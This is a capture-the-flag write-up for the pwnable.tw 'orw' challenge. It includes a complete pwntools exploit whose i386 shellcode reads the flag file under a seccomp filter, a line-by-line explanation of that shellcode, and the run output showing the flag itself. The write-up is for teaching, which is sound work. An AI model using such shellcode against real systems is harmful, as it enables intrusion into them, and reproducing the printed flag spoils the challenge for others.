# orw

**orw \[100 pts]**

Read the flag from `/home/orw/flag`.

Only `open` `read` `write` syscall are allowed to use.

`nc chall.pwnable.tw 10001`

```bash
$ ./orw
Give my your shellcode:shellcode
Segmentation fault (core dumped)
```

By just running it and the description, we know what to do. Just make a shellcode that have only open, read and write syscall and get the flag. But before doing anything (including the run actually) lets check the protection first to make it a habit when getting any pwn challenge.

```bash
$ file orw
orw: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e60ecccd9d01c8217387e8b77e9261a1f36b5030, not stripped
```

```bash
$ checksec orw
[*] '/mnt/c/Users/hzqzz/Downloads/tmp/orw'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

Decompiling in IDA

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  orw_seccomp();
  printf("Give my your shellcode:");
  read(0, &shellcode, 0xC8u);
  ((void (*)(void))shellcode)();
  return 0;
}
```

```c
unsigned int orw_seccomp()
{
  __int16 v1; // [esp+4h] [ebp-84h] BYREF
  char *v2; // [esp+8h] [ebp-80h]
  char v3[96]; // [esp+Ch] [ebp-7Ch] BYREF
  unsigned int v4; // [esp+6Ch] [ebp-1Ch]

  v4 = __readgsdword(0x14u);
  qmemcpy(v3, &unk_8048640, sizeof(v3));
  v1 = 12;
  v2 = v3;
  prctl(38, 1, 0, 0, 0);
  prctl(22, 2, &v1);
  return __readgsdword(0x14u) ^ v4;
}
```

#### Main Function:

1. **Shellcode Input** : Reads 200 bytes (`0xC8u`) of shellcode from stdin into a buffer.
2. **Execution** : Casts the shellcode buffer to a function pointer and executes it.

#### `orw_seccomp()` Function:

* **Seccomp Initialization** :
  * `prctl(38, 1, 0, 0, 0)` likely configures seccomp parameters (e.g., setting up a filter).
  * `prctl(22, 2, &v1)` enables strict seccomp mode (`PR_SET_SECCOMP`), restricting syscalls to those explicitly allowed by the filter.

Here's the exploit

```python
from pwn import *

context.arch = 'i386'
context.log_level = 'info'

shellcode = asm('''
    xor ecx, ecx            # O_RDONLY
    push 0x0                # null byte
    push 0x67616c66         # "flag"
    push 0x2f77726f         # "orw/"
    push 0x2f656d6f         # "ome/"
    push 0x682f2f2f         # "///h"
    mov ebx, esp            # "///home/orw/flag"
    mov eax, 5              # SYS_open
    int 0x80                # syscall(SYS_open, "///home/orw/flag", O_RDONLY)

    mov edx, 0x28           # length
    mov ecx, 0x0804a100     # buffer
    mov ebx, eax            # move file descriptor
    mov eax, 3              # SYS_read
    int 0x80                # syscall(SYS_read, fd, buff, length)

    mov edx, 0x28           # length
    mov ecx, 0x0804a100     # buffer
    mov ebx, 1              # STDOUT_FILENO
    mov eax, 4              # SYS_write
    int 0x80                # syscall(SYS_write, STDOUT_FILENO, buff, length)
''')

io = remote('chall.pwnable.tw', 10001)
io.sendlineafter(b'Give my your shellcode:', shellcode)
io.interactive()
```

```purebasic
$ python exploit.py
[+] Opening connection to chall.pwnable.tw on port 10001: Done
[*] Switching to interactive mode
FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}
\x00[*] Got EOF while reading in interactive
```

First we are constructing the file name

```armasm
push 0x0                # Null terminator
push 0x67616c66         # "flag" (ASCII: 'f','l','a','g')
push 0x2f77726f         # "orw/" (ASCII: '/','w','r','o')
push 0x2f656d6f         # "ome/" (ASCII: '/','e','m','o')
push 0x682f2f2f         # "///h" (ASCII: '/','/','/','h')
mov ebx, esp            # ebx = pointer to "///home/orw/flag\x00"
```

`///home/orw/flag` is equivalent to `/home/orw/flag` in Unix systems. We add // to file the 4 bytes

```armasm
mov eax, 5              # SYS_open (syscall number)
xor ecx, ecx            # O_RDONLY (read-only mode)
int 0x80                # open("///home/orw/flag", O_RDONLY)
```

To open the file. The file descriptor is returned in `eax`.

```armasm
mov edx, 0x28           # Read 40 bytes (0x28 = 40 in decimal)
mov ecx, 0x0804a100     # Buffer address (fixed location, likely writable in the target binary)
mov ebx, eax            # ebx = file descriptor from SYS_open
mov eax, 3              # SYS_read
int 0x80                # read(fd, buffer, 40)
```

To reads up to 40 bytes from the file into the buffer at `0x0804a100`.

```armasm
mov edx, 0x28           # Write 40 bytes
mov ecx, 0x0804a100     # Buffer address
mov ebx, 1              # STDOUT_FILENO (file descriptor 1)
mov eax, 4              # SYS_write
int 0x80                # write(STDOUT_FILENO, buffer, 40)
```

Then write to Stdout. Outputs the buffer contents.
